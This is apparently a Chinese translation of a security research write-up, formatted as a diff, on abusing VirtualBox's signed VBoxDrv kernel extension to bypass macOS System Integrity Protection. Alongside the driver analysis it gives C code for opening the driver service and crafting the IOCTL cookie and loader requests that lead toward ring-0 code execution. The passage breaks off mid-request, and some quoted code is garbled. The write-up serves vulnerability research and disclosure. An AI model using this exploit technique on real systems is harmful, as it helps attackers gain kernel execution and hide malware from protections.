@@ -1,0 +1,173 @@
+> 翻译：CoolCat  
+>  原文： kext-vulnerability/>
+系统完整性保护(System Integrity Protection即为下文章提到的SIP)是OS X El
+Capitan以后的MacOS中引入的一种安全策略，用于保护关键系统组件免受所有帐户(包括root用户)的攻击。自推出以来，出现了很多漏洞可以用来绕过了这项技术，要么出现在macOS本身，要么出现在第三方驱动程序。
+正如我们在前一篇探讨[AV自保护](https://www.mdsec.co.uk/2018/08/endpoint-security-self-protection-on-macos/)
+的文章中提到的，攻击者利用保护特性来隐藏或保护软件的能力的手法非常有趣。考虑到这一点，我想看看SIP的绕过是如何执行的，看看我们是否能找到一种方法通过签名驱动中的漏洞来实现这一点。由于我们将重点关注一个合法的内核驱动程序，漏洞可以适用于任意的MacOS系统上，漏洞执行仅需下载kext。
+这篇文章不涉及的是绕过安全内核扩展加载(SKEL)的能力。如果你对此感兴趣，可以看看Patrick Wardle最近的演讲。
+由于SIP是由macOS内核(XNU)强制执行的，因此我们将设置LLDB来探索Ring-0中的一些有趣区域。如果您需要一个关于如何实现此目的的演练，建议您查看我们在这里的前一篇文章[（点这儿）](https://www.mdsec.co.uk/2018/08/endpoint-security-self-protection-on-macos/)，里面如何使用VMWare Fusion配置虚拟调试环境。
+调试器设置好后，让我们首先看看如何找到一个脆弱的驱动程序…进入VirtualBox。
+### 0x01 在VirtualBox里面寻找希望
+众所周知，VirtualBox是甲骨文公司（Oracle）旗下的开源程序，其源代码[点这儿](https://www.virtualbox.org/browser/vbox/trunk)。下载安装VirtualBox后可以看到“kextstat”给出了以下加载的驱动程序列表:
+    222 3 0xffffff7f8703a000 0x64000 0x64000 org.virtualbox.kext.VBoxDrv (5.2.16) 8F6F825C-9920-39E4-AF20-6DD4F233D4F1 
+    223 0 0xffffff7f8709e000 0x8000 0x8000 org.virtualbox.kext.VBoxUSB (5.2.16) 1731469A-4A2D-32D4-8F03-4D138AAE1FE9 
+    225 0 0xffffff7f870a8000 0x5000 0x5000 org.virtualbox.kext.VBoxNetFlt (5.2.16) 59F71856-C064-3B98-A8AD-B2C33164FBC2 
+    226 0 0xffffff7f871f8000 0x6000 0x6000 org.virtualbox.kext.VBoxNetAdp (5.2.16) 24514714-1702-3FF6-90F8-8F3E79B4D8A4 
+下文着重关注`VBoxDrv`。这是VirtualBox的驱动程序之一。为了开始我们的分析，我们将使用`Darwin`特有的扩展代码，[点击我](https://www.virtualbox.org/browser/vbox/trunk/src/VBox/HostDrivers/Support/darwin)可以找到。
+刚开始可以看到一些I/O工具包代码的设置，IOUserClient类被继承:
+    class org_virtualbox_SupDrvClient : public IOUserClient
+    {
+    …
+    }
+我们将从方法`org_virtualbox_SupDrvClient::initWithTask`入手，该方法用于验证传递的类型并与`SUP_DARWIN_IOSERVICE_COOKIE`的值匹配:
+    /**
+    * Initializer called when the client opens the service.
+    */
+    bool org_virtualbox_SupDrvClient::initWithTask(task_t OwningTask, void *pvSecurityId, UInt32 u32Type)
+    {
+    …
+    if (u32Type != SUP_DARWIN_IOSERVICE_COOKIE)
+    {
+    LogRelMax(10,("org_virtualbox_SupDrvClient::initWithTask: Bad cookie %#x (%s)\n", u32Type, pszProcName));
+    return false;
+    }
+通过该检查后进入了方法`org_virtualbox_SupDrvClient::start(IOService
+*pProvider)`，其用于填充一个会话对象，并且允许我们与扩展进行交互:
+    /*
+    * Create a new session.
+    */
+    int rc = supdrvCreateSession(&g_DevExt, true /* fUser */, false /*fUnrestricted*/, &m_pSession);
+    if (RT_SUCCESS(rc)) { }
+这个内核扩展还通过`/dev/vboxdrv`和`/dev/vboxdrvu`公开了两个字符设备。如果我们看一下`VBoxDrvDarwinOpen`函数会发现它可以在任何字符设备上的开放调用时被调用，我们可以看到`/dev/vboxdrv`不同于`/dev/vboxdrvu`，因为它有一个“无限制”的标志:
+    static int VBoxDrvDarwinOpen(dev_t Dev, int fFlags, int fDevType, struct proc *pProcess)
+    {
+    ...
+    const bool fUnrestricted = minor(Dev) == 0;
+还可以看到在这个函数允许我们继续使用之前搜索活动会话列表:
+    pSession = g_apSessionHashTab[iHash];
+    while (pSession && pSession->Process != Process)
+    pSession = pSession->pNextHash;
+    if (pSession)
+    {
+    if (!pSession->fOpened)
+    {
+    pSession->fOpened = true;
+    pSession->fUnrestricted = fUnrestricted;
+    pSession->Uid = Uid;
+    pSession->Gid = Gid;
+    }
+    else
+    rc = VERR_ALREADY_LOADED;
+    }
+    else
+    rc = VERR_GENERAL_FAILURE;
+这意味着在调用字符设备上的开放函数之前必须保证有一个有效的会话是打开状态的。这是使用`IOServiceOpen API`调用和支持函数最直接的方法，比如:
+    io_connect_t open_service(const char *name) {
+    CFMutableDictionaryRef dict;
+    io_service_t service;
+    io_connect_t connect;
+    kern_return_t result;
+    mach_port_t masterPort;
+    io_iterator_t iter;
+    if ((dict = IOServiceMatching(name)) == NULL) {
+    printf("[!] IOServiceMatching call failed\n");
+    return -1;
+    }
+    if ((result = IOMasterPort(MACH_PORT_NULL, &masterPort)) != KERN_SUCCESS) {
+    printf("[!] IOMasterPort Call Failed\n");
+    return -1;
+    }
+    if ((result = IOServiceGetMatchingServices(masterPort, dict, &iter)) != KERN_SUCCESS) {
+    printf("[!] IOServiceGetMatchingServices call failed\n");
+    return -1;
+    }
+    service = IOIteratorNext(iter);
+    // Note the magic flag 0x64726962
+    if ((result = IOServiceOpen(service, mach_task_self(), 0x64726962, &connect)) != KERN_SUCCESS) {
+    printf("[!] IOServiceOpen failed %s\n", name);
+    return -1;
+    }
+    return connect;
+    }
+随后建立与`IOService连接，我们就可以对字符设备进行随意调用了。
+一旦获取到字符设备的文件句柄，我们就可以进行一个`IOCTL`调用，该调用由两个处理器其中之一支持，一个是`VBoxDrvDarwinIOCtl`，另一个是`VBoxDrvDarwinIOCtlSMAP`。这里我们看到，`VBoxDrvDarwinIOCtlSMAP`实际上是在执行传递给`VBoxDrvDarwinIOCtl`之前禁用`SMAP`，这就意味着如果我们能够在这个函数的入口和出口之间发现漏洞，就可以将执行返回到我们的用户域的shellcode:
+    static int VBoxDrvDarwinIOCtlSMAP(dev_t Dev, u_long iCmd, caddr_t pData, int fFlags, struct proc *pProcess)
+    {
+    /*
+    * Allow VBox R0 code to touch R3 memory. Setting the AC bit disables the
+    * SMAP check.
+    */
+    RTCCUINTREG fSavedEfl = ASMAddFlags(X86_EFL_AC);
+    int rc = VBoxDrvDarwinIOCtl(Dev, iCmd, pData, fFlags, pProcess);
+    #if defined(VBOX_STRICT) || defined(VBOX_WITH_EFLAGS_AC_SET_IN_VBOXDRV)
+    /*
+    * Before we restore AC and the rest of EFLAGS, check if the IOCtl handler code
+    * accidentially modified it or some other important flag.
+    */
+    if (RT_UNLIKELY( (ASMGetFlags() & (X86_EFL_AC | X86_EFL_IF | X86_EFL_DF | X86_EFL_IOPL))
+    != ((fSavedEfl & (X86_EFL_AC | X86_EFL_IF | X86_EFL_DF | X86_EFL_IOPL)) | X86_EFL_AC) ))
+    {
+    char szTmp[48];
+    RTStrPrintf(szTmp, sizeof(szTmp), "iCmd=%#x: %#x->%#x!", iCmd, (uint32_t)fSavedEfl, (uint32_t)ASMGetFlags());
+    supdrvBadContext(&g_DevExt, "SUPDrv-darwin.cpp", __LINE__, szTmp);
+    }
+    #endif
+    ASMSetFlags(fSavedEfl);
+    return rc;
+    }
+一旦传递给`VBoxDrvDarwinIOCtl`,
+`IOCTL`数据的参数就会从请求中提取一个报头并完成一些完整性检查。如果一切正常，执行路径就会从Darwin特定的代码转移到所有受支持的操作系统(supdrvIOCtl)中共享的代码。我们尝试利用一下这个脆弱的设定。
+在`supdrvIOCtl`中，我们首先看到`IOCTL`头的验证:
+    if (RT_UNLIKELY( (pReqHdr->fFlags & SUPREQHDR_FLAGS_MAGIC_MASK) != SUPREQHDR_FLAGS_MAGIC
+    || pReqHdr->cbIn cbIn > cbReq
+    || pReqHdr->cbOut cbOut > cbReq))
+这里的代码只是检查请求的长度，并确保flags字段中存在至上`SUPREQHDR_FLAGS_MAGIC_MASK`的值。
+接下来，根据前面设置的`fUnrestricted`变量的值，函数会产生两个执行结果:
+    if (pSession->fUnrestricted)
+    rc = supdrvIOCtlInnerUnrestricted(uIOCtl, pDevExt, pSession, pReqHdr);
+    else
+    rc = supdrvIOCtlInnerRestricted(uIOCtl, pDevExt, pSession, pReqHdr);
+快速看一下到这个if判断，因为这两个代码的路径公开了截然不同的IOCTL方法。`fUnrestricted`设置之间的主要区别是基于`/dev/vboxdrv`或`/dev/vboxdrvu`的打开，前者将`fUnrestricted`值设置为true。检查两个字符设备文件权限:
+    crw------- 1 root wheel 35, 0 11 Aug 23:59 /dev/vboxdrv
+    crw-rw-rw- 1 root wheel 35, 1 11 Aug 23:59 /dev/vboxdrvu
+很不幸，`/dev/vboxdrvu`(根据这文件权限，所有用户都可以使用它)没有任何值得开发的内容，那就意味着我们需要使用根用户访问`vboxdrv`。
+继续跟进`supdrvIOCtlInnerUnrestricted`，可以看到一些暴露的`IOCTL`方法供我们探索。我们对这篇文章感兴趣的三个方面是:
+  * SUP_IOCTL_COOKIE
+  * SUP_IOCTL_LDR_OPEN
+  * SUP_IOCTL_LDR_LOAD
+**SUP_IOCTL_COOKIE**  
+这是我们需要用于检索后续调用的`cookie`而进行的`IOCTL`调用。主要是为了验证步骤是在请求`u.In.szMagic`中存在的`SUPCOOKIE_MAGIC`的值。此外，`u.In.u32MinVersion`需要设置驱动程序所支持的版本。
+了解了这点之后，我们可以使用以下代码填充我们的初始请求:
+    SUPCOOKIE cookie;
+    memset(&cookie, 0, sizeof(SUPCOOKIE));
+    cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
+    cookie.Hdr.u32SessionCookie = 0x41424344;
+    cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
+    cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
+    cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
+    cookie.u.In.u32ReqVersion = SUPDRV_IOC_VERSION;
+    strcpy(cookie.u.In.szMagic, SUPCOOKIE_MAGIC);
+    cookie.u.In.u32MinVersion = 0x290001;
+    cookie.Hdr.rc = VERR_INTERNAL_ERROR;
+发包时可以看到我们收到了必须与标头中的后续请求一起转发的`cookie.u.Out.u32Cookie`值。
+**SUP_IOCTL_LDR_OPEN**
+对于这个调用，我们再次需要传递一些验证步骤，这只是设置正确的参数以满足以下要求的情况:
+    PSUPLDROPEN pReq = (PSUPLDROPEN)pReqHdr;
+    REQ_CHECK_SIZES(SUP_IOCTL_LDR_OPEN);
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, pReq->u.In.cbImageWithTabs > 0);
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, pReq->u.In.cbImageWithTabs u.In.cbImageBits > 0);
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, pReq->u.In.cbImageBits > 0);
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, pReq->u.In.cbImageBits u.In.cbImageWithTabs);
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, pReq->u.In.szName[0]);
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, RTStrEnd(pReq->u.In.szName, sizeof(pReq->u.In.szName)));
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, !supdrvCheckInvalidChar(pReq->u.In.szName, ";:()[]{}/\\|&*%#@!~`\"'"));
+    REQ_CHECK_EXPR(SUP_IOCTL_LDR_OPEN, RTStrEnd(pReq->u.In.szFilename, sizeof(pReq->u.In.szFilename)));
+通过这个阶段后进入`supdrvIOCtl_LdrOpen`方法，它将检查我们是否已经通过内核扩展加载了图像。如果不存在，就会分配一块内存，并通过IOCTL响应返回给我们。下面我们看到Ring-0中分配的内存被标记为可执行文件:
+    pImage->pvImageAlloc = RTMemExecAlloc(pImage->cbImageBits + 31);
+为了创建一个有效的请求，我们可以这样做:
+    SUPLDROPEN ldropen;
+    memset(&ldropen, 0, sizeof(SUPLDROPEN));
+    ldropen.Hdr.u32Cookie = cookie.u.Out.u32Cookie;
+    ldropen.Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
+    ldropen.Hdr.cbIn = sizeof(SUPLDROPEN);
+    ldropen.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
